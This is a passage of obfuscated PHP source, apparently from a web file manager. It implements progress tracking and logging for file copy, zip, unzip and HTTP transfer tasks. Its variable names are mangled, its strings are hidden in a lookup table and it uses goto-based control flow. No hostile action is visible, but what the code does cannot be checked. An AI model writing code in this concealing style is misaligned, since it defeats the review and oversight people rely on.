$èª½øÛğ[1796])); Hook::bind($èª½øÛğ[623], array($this, $èª½øÛğ[1796])); Hook::bind($èª½øÛğ[625], array($this, $èª½øÛğ[1796])); Hook::bind($èª½øÛğ[627], array($this, $èª½øÛğ[1796])); Hook::bind($èª½øÛğ[1797], array($this, $èª½øÛğ[1798])); Hook::bind($èª½øÛğ[643], array($this, $èª½øÛğ[1799])); $this->sourceModelCopyFlag = !1; Hook::bind($èª½øÛğ[1800], array($this, $èª½øÛğ[1801])); Hook::bind($èª½øÛğ[1802], array($this, $èª½øÛğ[1803])); Hook::bind($èª½øÛğ[1804], array($this, $èª½øÛğ[1805])); $”‚Š˜ü[$èª½øÛğ[1806]] = LNG($èª½øÛğ[1807]); $”‚Š˜ü[$èª½øÛğ[1808]] = 0; $”‚Š˜ü[$èª½øÛğ[1809]] = 0; $”‚Š˜ü[$èª½øÛğ[1115]] = $èª½øÛğ[22]; $”‚Š˜ü[$èª½øÛğ[1810]] = $èª½øÛğ[22]; $”‚Š˜ü[$èª½øÛğ[1811]] = 0; $”‚Š˜ü[$èª½øÛğ[1812]] = 0; $”‚Š˜ü[$èª½øÛğ[1813]] = 0; if (!$”‚Š˜ü[$èª½øÛğ[1643]]) { $”‚Š˜ü[$èª½øÛğ[1643]] = LNG($èª½øÛğ[1814]); } } protected function endAfter() { $Ô÷œÙ¯Ä =& $_SERVER[Õò”†—·]; Hook::unbind($Ô÷œÙ¯Ä[1785], array($this, $Ô÷œÙ¯Ä[1786])); Hook::unbind($Ô÷œÙ¯Ä[1277], array($this, $Ô÷œÙ¯Ä[1787])); Hook::unbind($Ô÷œÙ¯Ä[1788], array($this, $Ô÷œÙ¯Ä[1789])); Hook::unbind($Ô÷œÙ¯Ä[652], array($this, $Ô÷œÙ¯Ä[1790])); Hook::unbind($Ô÷œÙ¯Ä[653], array($this, $Ô÷œÙ¯Ä[1791])); Hook::unbind($Ô÷œÙ¯Ä[659], array($this, $Ô÷œÙ¯Ä[1792])); Hook::unbind($Ô÷œÙ¯Ä[660], array($this, $Ô÷œÙ¯Ä[1793])); Hook::unbind($Ô÷œÙ¯Ä[655], array($this, $Ô÷œÙ¯Ä[1794])); Hook::unbind($Ô÷œÙ¯Ä[657], array($this, $Ô÷œÙ¯Ä[1795])); Hook::unbind($Ô÷œÙ¯Ä[621], array($this, $Ô÷œÙ¯Ä[1796])); Hook::unbind($Ô÷œÙ¯Ä[618], array($this, $Ô÷œÙ¯Ä[1796])); Hook::unbind($Ô÷œÙ¯Ä[623], array($this, $Ô÷œÙ¯Ä[1796])); Hook::unbind($Ô÷œÙ¯Ä[625], array($this, $Ô÷œÙ¯Ä[1796])); Hook::unbind($Ô÷œÙ¯Ä[627], array($this, $Ô÷œÙ¯Ä[1796])); Hook::unbind($Ô÷œÙ¯Ä[1797], array($this, $Ô÷œÙ¯Ä[1798])); Hook::unbind($Ô÷œÙ¯Ä[643], array($this, $Ô÷œÙ¯Ä[1799])); Hook::unbind($Ô÷œÙ¯Ä[1800], array($this, $Ô÷œÙ¯Ä[1801])); Hook::unbind($Ô÷œÙ¯Ä[1802], array($this, $Ô÷œÙ¯Ä[1803])); Hook::unbind($Ô÷œÙ¯Ä[1804], array($this, $Ô÷œÙ¯Ä[1805])); } public function copyMoveStart($ Õª×â‰, $ŞÄºÕ³Œ, $¶íùíéó, $ˆ˜•üÉ‡) { $ò¸°½€ =& $_SERVER[Õò”†—·]; self::log($ò¸°½€[1815] . $ŞÄºÕ³Œ . $ò¸°½€[83] . $ˆ˜•üÉ‡); $ÈÀ‹öÛş = rtrim(TEMP_FILES, $ò¸°½€[18]); if (substr($ŞÄºÕ³Œ, 0, strlen($ÈÀ‹öÛş)) == $ÈÀ‹öÛş) { return; } if (substr($ˆ˜•üÉ‡, 0, strlen($ÈÀ‹öÛş)) == $ÈÀ‹öÛş) { return; } $ãÉÜÕÖ =& $this->task; $ãÉÜÕÖ[$ò¸°½€[1816]] = KodIO::transferType($ Õª×â‰, $¶íùíéó); $this->update(); } public function updateAfter() { $ß¿ŸĞñô =& $_SERVER[Õò”†—·]; $ïÏºü¤­ =& $this->task; if (!$ïÏºü¤­[$ß¿ŸĞñô[814]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ïÏºü¤­[$ß¿ŸĞñô[1816]] == $ß¿ŸĞñô[1369]) { return; } self::updateTask($ïÏºü¤­); } private static function updateTask(&$œÖ¦–à) { $†–ù¬¯Ç =& $_SERVER[Õò”†—·]; if ($œÖ¦–à[$†–ù¬¯Ç[1816]] == $†–ù¬¯Ç[1248] || $œÖ¦–à[$†–ù¬¯Ç[1816]] == $†–ù¬¯Ç[120]) { if ($œÖ¦–à[$†–ù¬¯Ç[1810]]) { $œÖ¦–à[$†–ù¬¯Ç[1813]] = $œÖ¦–à[$†–ù¬¯Ç[1812]] + $œÖ¦–à[$†–ù¬¯Ç[1809]]; } } else { if ($œÖ¦–à[$†–ù¬¯Ç[1816]] == $†–ù¬¯Ç[1370]) { if ($œÖ¦–à[$†–ù¬¯Ç[1810]] == $†–ù¬¯Ç[1248]) { $œÖ¦–à[$†–ù¬¯Ç[1813]] = $œÖ¦–à[$†–ù¬¯Ç[1812]] + $œÖ¦–à[$†–ù¬¯Ç[1809]] * 0.5; } else { if ($œÖ¦–à[$†–ù¬¯Ç[1810]] == $†–ù¬¯Ç[120]) { $œÖ¦–à[$†–ù¬¯Ç[1813]] = $œÖ¦–à[$†–ù¬¯Ç[1812]] + $œÖ¦–à[$†–ù¬¯Ç[1808]] * 0.5 + $œÖ¦–à[$†–ù¬¯Ç[1809]] * 0.5; } } } } $œÖ¦–à[$†–ù¬¯Ç[1757]] = $œÖ¦–à[$†–ù¬¯Ç[1813]] / $œÖ¦–à[$†–ù¬¯Ç[814]]; if ($œÖ¦–à[$†–ù¬¯Ç[1757]] > 0) { $ó¦º ªŞ = timeFloat() - $œÖ¦–à[$†–ù¬¯Ç[1759]] - $œÖ¦–à[$†–ù¬¯Ç[1762]]; $œÖ¦–à[$†–ù¬¯Ç[1763]] = $ó¦º ªŞ * (1 - $œÖ¦–à[$†–ù¬¯Ç[1757]]) / $œÖ¦–à[$†–ù¬¯Ç[1757]]; } } public function addPath($ÖÙ€ÍĞ¾) { $©ƒá†Á =& $_SERVER[Õò”†—·]; if (!$ÖÙ€ÍĞ¾) { return; } $œĞµ¹šÄ =& $this->task; $¤ÃÒ¬ÏÂ = IO::infoWithChildren($ÖÙ€ÍĞ¾); $¦’€úğÔ = $œĞµ¹šÄ[$©ƒá†Á[1817]] ? $œĞµ¹šÄ[$©ƒá†Á[1817]][$©ƒá†Á[1818]] : 0; $œĞµ¹šÄ[$©ƒá†Á[1817]] = array($©ƒá†Á[1818] => $¦’€úğÔ + 1, $©ƒá†Á[478] => $¤ÃÒ¬ÏÂ[$©ƒá†Á[42]], $©ƒá†Á[97] => $¤ÃÒ¬ÏÂ[$©ƒá†Á[97]], $©ƒá†Á[567] => $¤ÃÒ¬ÏÂ[$©ƒá†Á[567]] ? $¤ÃÒ¬ÏÂ[$©ƒá†Á[567]] : $¤ÃÒ¬ÏÂ[$©ƒá†Á[97]]); if ($¤ÃÒ¬ÏÂ[$©ƒá†Á[43]] == $©ƒá†Á[231]) { $œĞµ¹šÄ[$©ƒá†Á[1113]] += 1; } else { $œĞµ¹šÄ[$©ƒá†Á[1113]] += $¤ÃÒ¬ÏÂ[$©ƒá†Á[92]][$©ƒá†Á[90]]; if ($¤ÃÒ¬ÏÂ[$©ƒá†Á[194]]) { $œĞµ¹šÄ[$©ƒá†Á[1113]] += $¤ÃÒ¬ÏÂ[$©ƒá†Á[92]][$©ƒá†Á[91]] + 1; } } $œĞµ¹šÄ[$©ƒá†Á[814]] += $¤ÃÒ¬ÏÂ[$©ƒá†Á[89]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¯ÅÄë…“) { } public function sourceAddHashEnd($‹ş¦«†ñ) { } public function sourceAddFileStart($óó’´î) { $¾Œ°Ú®ô =& $_SERVER[Õò”†—·]; $‡İ±»ÀÁ =& $this->task; $‡İ±»ÀÁ[$¾Œ°Ú®ô[1808]] = $óó’´î[$¾Œ°Ú®ô[89]]; $‡İ±»ÀÁ[$¾Œ°Ú®ô[1806]] = $óó’´î[$¾Œ°Ú®ô[42]]; $‡İ±»ÀÁ[$¾Œ°Ú®ô[1115]] = $óó’´î[$¾Œ°Ú®ô[42]]; $‡İ±»ÀÁ[$¾Œ°Ú®ô[1819]] = $óó’´î[$¾Œ°Ú®ô[97]]; $this->update(); } public function sourceAddFileEnd($ÀÕáö¡³) { $¨ïÈÌÂ° =& $_SERVER[Õò”†—·]; $¥¹²êÔÔ =& $this->task; $¥¹²êÔÔ[$¨ïÈÌÂ°[1813]] += $ÀÕáö¡³[$¨ïÈÌÂ°[89]]; $¥¹²êÔÔ[$¨ïÈÌÂ°[1819]] = $ÀÕáö¡³[$¨ïÈÌÂ°[97]]; $this->update(1); } public function copyFileStart($ï»³¶¬ı, $¨±«Ø¯, $•¬ŞÄ“ı, $ïœ‚åö, $ï«”ü, $åò÷Û›) { $µĞÜÙàş =& $_SERVER[Õò”†—·]; $Íšáç = $ï«”ü; if ($Íšáç == $GLOBALS[$µĞÜÙàş[1820]]) { $Íšáç = $GLOBALS[$µĞÜÙàş[1821]]; } $GLOBALS[$µĞÜÙàş[1821]] = $ï«”ü; $GLOBALS[$µĞÜÙàş[1820]] = $åò÷Û›; $Ñ§ëİ =& $this->task; $Ñ§ëİ[$µĞÜÙàş[1806]] = $Íšáç; $Ñ§ëİ[$µĞÜÙàş[1808]] = (int) $ï»³¶¬ı->size($¨±«Ø¯); $Ñ§ëİ[$µĞÜÙàş[1809]] = 0; $Ñ§ëİ[$µĞÜÙàş[1115]] = $µĞÜÙàş[22]; $Ñ§ëİ[$µĞÜÙàş[1810]] = $µĞÜÙàş[22]; $Ñ§ëİ[$µĞÜÙàş[1811]] = 0; $ÈÏá´çÀ = $Ñ§ëİ[$µĞÜÙàş[1808]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ñ§ëİ[$µĞÜÙàş[459]] . $µĞÜÙàş[1822]); if ($ÈÏá´çÀ && file_exists(get_path_father($ïœ‚åö))) { Cache::set($Ñ§ëİ[$µĞÜÙàş[459]] . $µĞÜÙàş[1822], $ïœ‚åö); $Ñ§ëİ[$µĞÜÙàş[1779]] = array($µĞÜÙàş[1823], $µĞÜÙàş[1824]); } $this->update(0, $ÈÏá´çÀ); } public static function updateCopyLocalFileSize($Æö’ŞòÅ) { $“ˆ®ÚéÀ =& $_SERVER[Õò”†—·]; $İ×ĞÕ€€ = Cache::get($Æö’ŞòÅ[$“ˆ®ÚéÀ[459]] . $“ˆ®ÚéÀ[1822]); if (!$İ×ĞÕ€€ || !file_exists($İ×ĞÕ€€)) { return $Æö’ŞòÅ; } $Æö’ŞòÅ[$“ˆ®ÚéÀ[1809]] = @filesize($İ×ĞÕ€€); $Æö’ŞòÅ[$“ˆ®ÚéÀ[1813]] += $Æö’ŞòÅ[$“ˆ®ÚéÀ[1809]]; self::updateTask($Æö’ŞòÅ); return $Æö’ŞòÅ; } public function copyFileEnd($ößæù·¶, $»êûåæ—, $Îˆ¯øĞİ, $«‰³ê«, $ôÅ×ŒüÔ, $‚š›´) { $µÛó‚ İ =& $_SERVER[Õò”†—·]; $èñ…ç•  =& $this->task; $èñ…ç• [$µÛó‚ İ[1809]] = $èñ…ç• [$µÛó‚ İ[1808]]; $èñ…ç• [$µÛó‚ İ[1810]] = $µÛó‚ İ[22]; unset($èñ…ç• [$µÛó‚ İ[1779]]); if ($ôÅ×ŒüÔ == $èñ…ç• [$µÛó‚ İ[1806]]) { $èñ…ç• [$µÛó‚ İ[1812]] += $èñ…ç• [$µÛó‚ İ[1808]]; $èñ…ç• [$µÛó‚ İ[1813]] = $èñ…ç• [$µÛó‚ İ[1812]]; $—ÚóÔ»Ä = 1; if (isset($èñ…ç• [$µÛó‚ İ[1819]]) && $èñ…ç• [$µÛó‚ İ[1819]] == $»êûåæ—) { $—ÚóÔ»Ä = 0; } $this->update($—ÚóÔ»Ä); } else { $this->update(); $èñ…ç• [$µÛó‚ İ[1809]] = 0; } Cache::remove($èñ…ç• [$µÛó‚ İ[459]] . $µÛó‚ İ[1822]); self::log($µÛó‚ İ[1825] . $»êûåæ— . $µÛó‚ İ[83] . $«‰³ê« . $µÛó‚ İ[12] . $ôÅ×ŒüÔ . $µÛó‚ İ[1826] . $èñ…ç• [$µÛó‚ İ[1806]]); } public function updateFileEnd($¹â‡Ìî, $¹Å÷ŞÄã) { $Ğ†›° º =& $_SERVER[Õò”†—·]; $ŒÚ–ûÕÆ =& $this->task; $ŒÚ–ûÕÆ[$Ğ†›° º[1806]] = $¹â‡Ìî; $ŒÚ–ûÕÆ[$Ğ†›° º[1808]] = $¹Å÷ŞÄã; $ŒÚ–ûÕÆ[$Ğ†›° º[1812]] += $¹Å÷ŞÄã; $ŒÚ–ûÕÆ[$Ğ†›° º[1813]] = $ŒÚ–ûÕÆ[$Ğ†›° º[1812]]; $this->update(1); self::log($Ğ†›° º[1827] . $¹â‡Ìî); } public function sourceModelCopy($ ùãêıÌ) { $İÄ±‰âğ =& $_SERVER[Õò”†—·]; $ÙåÉĞĞ = $ ùãêıÌ[0]; $¸£ê¤Ò = $ ùãêıÌ[1]; $§Ãäšõö =& $this->task; $this->sourceModelCopyFlag = !0; $Õ–…Ö½ = 0; switch ($ÙåÉĞĞ) { case $İÄ±‰âğ[619]: $Õ–…Ö½ = 1; break; case $İÄ±‰âğ[622]: $§Ãäšõö[$İÄ±‰âğ[1806]] = $¸£ê¤Ò[$İÄ±‰âğ[42]]; break; case $İÄ±‰âğ[624]: $Õ–…Ö½ = intval($ ùãêıÌ[$İÄ±‰âğ[440]] * 0.4); break; case $İÄ±‰âğ[626]: $Õ–…Ö½ = intval($ ùãêıÌ[$İÄ±‰âğ[440]] * 0.2); break; case $İÄ±‰âğ[628]: $Õ–…Ö½ = intval($ ùãêıÌ[$İÄ±‰âğ[440]] * 0.4); break; } $this->update($Õ–…Ö½); $this->sourceModelCopyFlag = !1; } public function sourceRemove($û¯“‡Ü, $å©ºƒ®¸) { $ªí¬À¿ =& $_SERVER[Õò”†—·]; $this->sourceModelCopyFlag = !0; $Ï€Ï·³· = 1; if (isset($û¯“‡Ü[$ªí¬À¿[92]])) { $Ï€Ï·³· = $û¯“‡Ü[$ªí¬À¿[92]][$ªí¬À¿[90]]; $Ï€Ï·³· = $Ï€Ï·³· + $û¯“‡Ü[$ªí¬À¿[92]][$ªí¬À¿[91]] + 1; } $this->update($Ï€Ï·³·); $this->sourceModelCopyFlag = !1; } public function sourceMove($™Šı§ä¢) { $this->sourceRemove($™Šı§ä¢, !1); } public function curlProgress($òßıˆ˜À, $çíˆé§Â, $¼§Ê¶ã•, $ôÏ¨Û¥§, $§÷¢Çßß) { $Û¢”Ùà =& $_SERVER[Õò”†—·]; $ííºÎŸñ =& $this->task; if ($§÷¢Çßß > 0) { $ííºÎŸñ[$Û¢”Ùà[1115]] = $Û¢”Ùà[1828]; $ííºÎŸñ[$Û¢”Ùà[1810]] = $Û¢”Ùà[120]; if ($ííºÎŸñ[$Û¢”Ùà[1808]]) { $ííºÎŸñ[$Û¢”Ùà[1809]] = $§÷¢Çßß; } if ($ííºÎŸñ[$Û¢”Ùà[1811]]) { $ííºÎŸñ[$Û¢”Ùà[1809]] = $§÷¢Çßß + $ííºÎŸñ[$Û¢”Ùà[1811]]; } } else { if ($¼§Ê¶ã• > 0) { if ($ííºÎŸñ[$Û¢”Ùà[1808]] == $çíˆé§Â) { $ííºÎŸñ[$Û¢”Ùà[1809]] = $¼§Ê¶ã•; $ííºÎŸñ[$Û¢”Ùà[1115]] = $Û¢”Ùà[1829]; $ííºÎŸñ[$Û¢”Ùà[1810]] = $Û¢”Ùà[1248]; } } } $this->update(); } public function curlProgressStart($Ú±Şšô«) { } public function curlProgressEnd($ˆ½ÌäŠ) { $ŒËıàæ =& $_SERVER[Õò”†—·]; $ã¾¦«³Ã =& $this->task; $¦‰Í­¨¡ = curl_getinfo($ˆ½ÌäŠ); $œÓÄ‚ı– = $¦‰Í­¨¡[$ŒËıàæ[1830]]; if ($œÓÄ‚ı– == -1) { $œÓÄ‚ı– = $¦‰Í­¨¡[$ŒËıàæ[1831]]; } if ($ã¾¦«³Ã[$ŒËıàæ[1810]] == $ŒËıàæ[120] && $œÓÄ‚ı–) { $ã¾¦«³Ã[$ŒËıàæ[1811]] += $œÓÄ‚ı–; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $À˜Íè =& $_SERVER[Õò”†—·]; $©ã¿ï˜ü =& $this->task; $©ã¿ï˜ü[$À˜Íè[1832]] = 1; Hook::bind($À˜Íè[1800], array($this, $À˜Íè[1833])); Hook::bind($À˜Íè[1802], array($this, $À˜Íè[1834])); Hook::bind($À˜Íè[1804], array($this, $À˜Íè[1835])); } protected function endAfter() { $¯Úß°õã =& $_SERVER[Õò”†—·]; Hook::unbind($¯Úß°õã[1800], array($this, $¯Úß°õã[1833])); Hook::unbind($¯Úß°õã[1802], array($this, $¯Úß°õã[1834])); Hook::unbind($¯Úß°õã[1804], array($this, $¯Úß°õã[1835])); } public function progressStart($ñÚ½‡ìÃ) { $×Œì´‘© =& $_SERVER[Õò”†—·]; $ÆÌ»íë¡ = curl_getinfo($ñÚ½‡ìÃ); self::log($×Œì´‘©[1836] . $ÆÌ»íë¡[$×Œì´‘©[367]]); self::valueSet($this->task[$×Œì´‘©[459]], $this->task); } public function progressEnd($ö–à»…Í) { $˜‚°¼¢ß =& $_SERVER[Õò”†—·]; self::log($˜‚°¼¢ß[1837] . $this->task[$˜‚°¼¢ß[459]]); $this->end(); } public function progress($ğÂÚ³ı, $š‘º‡³Ú, $Šã”Úê, $ËæÃ†Äš, $¤‘µÛºØ) { $Ù÷ìÍ Ê =& $_SERVER[Õò”†—·]; $‘ş„µé÷ =& $this->task; if ($¤‘µÛºØ > 0) { $‘ş„µé÷[$Ù÷ìÍ Ê[1113]] = $‘ş„µé÷[$Ù÷ìÍ Ê[1113]] == 0 ? $ËæÃ†Äš : $‘ş„µé÷[$Ù÷ìÍ Ê[1113]]; $‘ş„µé÷[$Ù÷ìÍ Ê[1756]] = $¤‘µÛºØ; } else { if ($Šã”Úê > 0) { $‘ş„µé÷[$Ù÷ìÍ Ê[1113]] = $‘ş„µé÷[$Ù÷ìÍ Ê[1113]] == 0 ? $š‘º‡³Ú : $‘ş„µé÷[$Ù÷ìÍ Ê[1113]]; $‘ş„µé÷[$Ù÷ìÍ Ê[1756]] = $Šã”Úê; } } $this->update(); self::log("\160\x72\157\147\x72\x65\163\163\x48\164\x74\160\72\x64\x6f\x77\x6e\x3a{$Šã”Úê}\57{$š‘º‡³Ú}\73\x20\165\160\x6c\157\x61\144\72{$¤‘µÛºØ}\x2f{$ËæÃ†Äš}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¶Ô âÍ±, $Ö™»°ê = '', $Ÿß„ÕÆˆ = 0, $à‚“ğÛ« = '') { $Õì™ß‰Ì =& $_SERVER[Õò”†—·]; $à‚“ğÛ« = $à‚“ğÛ« ? $à‚“ğÛ« : ($Ö™»°ê ? $Ö™»°ê : $¶Ô âÍ±); $š¥éÂğÇ = new Task($¶Ô âÍ±, $Ö™»°ê, $Ÿß„ÕÆˆ, $à‚“ğÛ«); $GLOBALS[$Õì™ß‰Ì[1838] . $¶Ô âÍ±] = new TaskLog($Õì™ß‰Ì[1739], $š¥éÂğÇ, $à‚“ğÛ«); return $š¥éÂğÇ; } public function __construct($¨úñíœå = '', $·ÓáÕ• = '', $ìÌÔ¿ùÁ = '') { $Ôøòşê =& $_SERVER[Õò”†—·]; if (!$¨úñíœå) { $¨úñíœå = $Ôøòşê[1739]; } $ìÎ¿ôÍ£ = $¨úñíœå . $Ôøòşê[446] . rand_string(10); if (!$ìÌÔ¿ùÁ) { $ìÌÔ¿ùÁ = $¨úñíœå . $Ôøòşê[63] . $ìÌÔ¿ùÁ; } switch ($¨úñíœå) { case $Ôøòşê[1739]: if (!$·ÓáÕ• || !$·ÓáÕ•->task) { return echoLog($¨úñíœå . $Ôøòşê[1839]); } $–¥ôÍÈ = $·ÓáÕ•; $ìÎ¿ôÍ£ = $–¥ôÍÈ->task[$Ôøòşê[459]]; $¨úñíœå = $–¥ôÍÈ->task[$Ôøòşê[459]]; if (!$–¥ôÍÈ->task[$Ôøòşê[1643]]) { $–¥ôÍÈ->task[$Ôøòşê[1643]] = $ìÌÔ¿ùÁ ? $ìÌÔ¿ùÁ : $¨úñíœå; } break; case $Ôøòşê[1840]: if (!$·ÓáÕ•) { return echoLog($¨úñíœå . $Ôøòşê[1841]); } $”Œˆü = is_string($·ÓáÕ•) ? array($·ÓáÕ•) : $·ÓáÕ•; $–¥ôÍÈ = new TaskFileTransfer($ìÎ¿ôÍ£, $¨úñíœå, 0, $ìÌÔ¿ùÁ ? $ìÌÔ¿ùÁ : $”Œˆü[0]); foreach ($”Œˆü as $÷ï¶Éğ) { $–¥ôÍÈ->addPath($÷ï¶Éğ); } break; case $Ôøòşê[373]: if (!$·ÓáÕ•) { return echoLog($¨úñíœå . $Ôøòşê[1841]); } $”Œˆü = is_string($·ÓáÕ•) ? array($·ÓáÕ•) : $·ÓáÕ•; $–¥ôÍÈ = new TaskZip($ìÎ¿ôÍ£, $¨úñíœå, 0, $ìÌÔ¿ùÁ ? $ìÌÔ¿ùÁ : $”Œˆü[0]); foreach ($”Œˆü as $÷ï¶Éğ) { $–¥ôÍÈ->addPath($÷ï¶Éğ); } break; case $Ôøòşê[1268]: if (!$·ÓáÕ•) { return echoLog($¨úñíœå . $Ôøòşê[1841]); } $–¥ôÍÈ = new TaskUnZip($ìÎ¿ôÍ£, $¨úñíœå, 0, $ìÌÔ¿ùÁ ? $ìÌÔ¿ùÁ : $·ÓáÕ•); if ($·ÓáÕ•) { $–¥ôÍÈ->addFile($·ÓáÕ•); } break; case $Ôøòşê[162]: $–¥ôÍÈ = new TaskHttp($ìÎ¿ôÍ£, $¨úñíœå); break; default: return; break; } $this->task = $–¥ôÍÈ; $this->taskID = $ìÎ¿ôÍ£; Hook::bind($Ôøòşê[1776], array($this, $Ôøòşê[1842])); Hook::bind($Ôøòşê[1778], array($this, $Ôøòşê[1843])); Hook::bind($Ôøòşê[1772], array($this, $Ôøòşê[1844])); echoLog($Ôøòşê[1845] . $–¥ôÍÈ->task[$Ôøòşê[1643]]); } public function __destruct() { $this->end(); } public function end($¬¥¤×¸ı = '') { $š°ÖƒĞ² =& $_SERVER[Õò”†—·]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¬¥¤×¸ı); $this->task = !1; $this->taskID = !1; Hook::unbind($š°ÖƒĞ²[1776], array($this, $š°ÖƒĞ²[1842])); Hook::unbind($š°ÖƒĞ²[1778], array($this, $š°ÖƒĞ²[1843])); Hook::unbind($š°ÖƒĞ²[1772], array($this, $š°ÖƒĞ²[1844])); } public function taskUpdate($Ô×¼¼±”) { $áÄÆêöå =& $_SERVER[Õò”†—·]; if (!$Ô×¼¼±” || $this->taskID != $Ô×¼¼±”[$áÄÆêöå[459]]) { return; } $ÖéŸñ = 20; $³¥”Çú = intval($Ô×¼¼±”[$áÄÆêöå[1757]] * $ÖéŸñ); $ÅÜößó = $áÄÆêöå[176] . str_repeat($áÄÆêöå[934], $³¥”Çú) . $áÄÆêöå[1064] . str_repeat($áÄÆêöå[63], $ÖéŸñ - $³¥”Çú) . $áÄÆêöå[178]; $ÉÓÈïêƒ = $ÅÜößó . sprintf($áÄÆêöå[1846], $Ô×¼¼±”[$áÄÆêöå[1757]] * 100) . $áÄÆêöå[1847]; $ó×ğ™°É = $ÉÓÈïêƒ . $Ô×¼¼±”[$áÄÆêöå[1756]] . $áÄÆêöå[18] . $Ô×¼¼±”[$áÄÆêöå[1113]] . LNG($áÄÆêöå[1848]); $ÙœÙƒ„› = $áÄÆêöå[22]; if ($Ô×¼¼±”[$áÄÆêöå[1832]]) { $ó×ğ™°É = $ÉÓÈïêƒ . size_format($Ô×¼¼±”[$áÄÆêöå[1756]]) . $áÄÆêöå[18] . size_format($Ô×¼¼±”[$áÄÆêöå[1113]]); $ÙœÙƒ„› = size_format($Ô×¼¼±”[$áÄÆêöå[1758]]) . $áÄÆêöå[1849]; } if ($Ô×¼¼±”[$áÄÆêöå[1115]]) { $Ô×¼¼±”[$áÄÆêöå[1806]] = $Ô×¼¼±”[$áÄÆêöå[1115]] . $áÄÆêöå[63] . $Ô×¼¼±”[$áÄÆêöå[1806]]; } if ($Ô×¼¼±”[$áÄÆêöå[1806]]) { $»œİáµ¸ = $áÄÆêöå[22]; if ($Ô×¼¼±”[$áÄÆêöå[1808]]) { $»œİáµ¸ = $áÄÆêöå[60] . size_format($Ô×¼¼±”[$áÄÆêöå[1809]]) . $áÄÆêöå[18] . size_format($Ô×¼¼±”[$áÄÆêöå[1808]]); } $ÙœÙƒ„› .= $Ô×¼¼±”[$áÄÆêöå[1806]] . $»œİáµ¸; } if ($Ô×¼¼±”[$áÄÆêöå[814]] && !$Ô×¼¼±”[$áÄÆêöå[1808]]) { $ÙœÙƒ„› .= $áÄÆêöå[63] . size_format($Ô×¼¼±”[$áÄÆêöå[1813]]) . $áÄÆêöå[18] . size_format($Ô×¼¼±”[$áÄÆêöå[814]]); } echoLog($ó×ğ™°É . $áÄÆêöå[63] . $ÙœÙƒ„›, !0); } public function taskEnd($ï‡ú¸‚Ì) { $ÓäíÀ«ı =& $_SERVER[Õò”†—·]; if (!$ï‡ú¸‚Ì || $this->taskID != $ï‡ú¸‚Ì[$ÓäíÀ«ı[459]]) { return; } $¾¼¯´˜ = $ï‡ú¸‚Ì ? $ï‡ú¸‚Ì[$ÓäíÀ«ı[1756]] . $ÓäíÀ«ı[18] . $ï‡ú¸‚Ì[$ÓäíÀ«ı[1113]] . LNG($ÓäíÀ«ı[1848]) . $ÓäíÀ«ı[84] : $ÓäíÀ«ı[22]; echoLog($ÓäíÀ«ı[1850] . $ï‡ú¸‚Ì[$ÓäíÀ«ı[1643]] . ($ï‡ú¸‚Ì[$ÓäíÀ«ı[510]] ? $ÓäíÀ«ı[84] . $ï‡ú¸‚Ì[$ÓäíÀ«ı[510]] : $ÓäíÀ«ı[22]) . $ÓäíÀ«ı[84] . $¾¼¯´˜ . $ÓäíÀ«ı[1851] . sprintf($ÓäíÀ«ı[901], timeFloat() - $ï‡ú¸‚Ì[$ÓäíÀ«ı[1759]]) . $ÓäíÀ«ı[1771]); $this->end(); } public function taskKill($İİ«–¦) { $ºèã¶‰Ö =& $_SERVER[Õò”†—·]; if (!$İİ«–¦ || $this->taskID != $İİ«–¦[$ºèã¶‰Ö[459]]) { return; } echoLog($ºèã¶‰Ö[1852] . $İİ«–¦[$ºèã¶‰Ö[1643]]); } } goto BìäÙ­‰¢•; d¸Ì•ÛÙ: function binCheckBigger($š™ºË›, $ÍÏË¡æ) { return $š™ºË› > $ÍÏË¡æ; } $_SERVER[$_SERVER[Õ°á¾ÔŸ][3]] = ("\x38\x34\x38\x35"."\62\70")+0;$_yn8o="prwdivf548ayh79sgb1qnjkle6tz30x2comus4zk9o3lwg0ip17u2atcnfbve8m5xhjqr6dy1yk0ct";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ò¥ışõ, $êşåâ•) { $¨õòŸôÓ =& $_SERVER[Õò”†—·]; if (isset(self::$_methodList[$ò¥ışõ])) { return @call_user_func_array(self::$_methodList[$ò¥ışõ], $êşåâ•); } else { if (method_exists($this, $ò¥ışõ)) { return call_user_func_array(array($this, $ò¥ışõ), $êşåâ•); } else { think_exception(__CLASS__ . $¨õòŸôÓ[4] . $ò¥ışõ . $¨õòŸôÓ[5]); } } } public static function __callStatic($¡±ğ¤¿ , $ûã©æ¹„) { if (isset(self::$_methodListStatic[$¡±ğ¤¿ ])) { return call_user_func_array(self::$_methodListStatic[$¡±ğ¤¿ ], $ûã©æ¹„); } else { if (method_exists(self, $¡±ğ¤¿ )) { return call_user_func_array(array(self, $¡±ğ¤¿ ), $ûã©æ¹„); } else { show_json("{$¡±ğ¤¿ }\50\x29\x20\x6e\x6f\x74\x20\145\170\x69\163\x74\73", !1); } } } public static function addMethod($¡¹—³‹¦, $¿ˆ¯ú»±) { self::$_methodList[$¡¹—³‹¦] = $¿ˆ¯ú»±; } public static function addMethodStatic($Ú‚µ²ä, $´½óºĞ©) { self::$_methodListStatic[$Ú‚µ²ä] = $´½óºĞ©; } } goto aÇƒçªŒ‰ó; DÜ©Ä¼¤: class PathDriverDbShareItem extends PathDriverDB { public function __construct($¹é¹şáñ) { $this->pathParse = $¹é¹şáñ; $this->model = Model($_SERVER[Õò”†—·][1388]); } public function getPathOuter($ìÖ×±Ñ¨) { $ °Ò¼¾é =& $_SERVER[Õò”†—·]; if (!$ìÖ×±Ñ¨) { return $ìÖ×±Ñ¨; } $£Ş–ƒæû = $this->parse($ìÖ×±Ñ¨); return trim(KodIO::makeShare($this->pathParse[$ °Ò¼¾é[459]], $£Ş–ƒæû[$ °Ò¼¾é[459]]), $ °Ò¼¾é[18]); } protected function infoParse($èŒµÛ§, $º±¿ç©× = false, $ŞÉ±Êğù = false) { $Šİµ¥İ =& $_SERVER[Õò”†—·]; $”€šª“ = $this->pathParse[$Šİµ¥İ[459]]; $¸í€¼Ğç = trim($this->pathParse[$Šİµ¥İ[1222]], $Šİµ¥İ[18]); return 